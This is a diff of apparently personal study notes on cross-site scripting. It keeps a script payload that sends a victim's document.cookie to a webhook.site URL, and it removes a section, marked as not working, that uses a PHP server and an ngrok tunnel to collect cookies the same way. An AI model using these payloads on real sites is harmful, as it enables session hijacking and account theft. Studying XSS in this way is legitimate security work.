@@ -42,22 +42,6 @@ goto [WebHook website](https://webhook.site/) to get a https to redirect users a
 <script>document.location='	https://webhook.site/...?c=' + document.cookie</script>
 ```
 
-#### Exploit local server // not working 
-
-```bash
-$> php -S localhost:9999
-...
-$> ngrok http 9999
-Forwarding                    https://58e1-89-207-171-106.ngrok-free.app -> http://localhost:9999
-...
-```
-
-```js
-<script>document.location='https://58e1-89-207-171-106.ngrok-free.app?c=' + document.cookie</script>
-```
-
-Then check php server to see all cookies.
-
 ## Reflected XSS
 
 Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
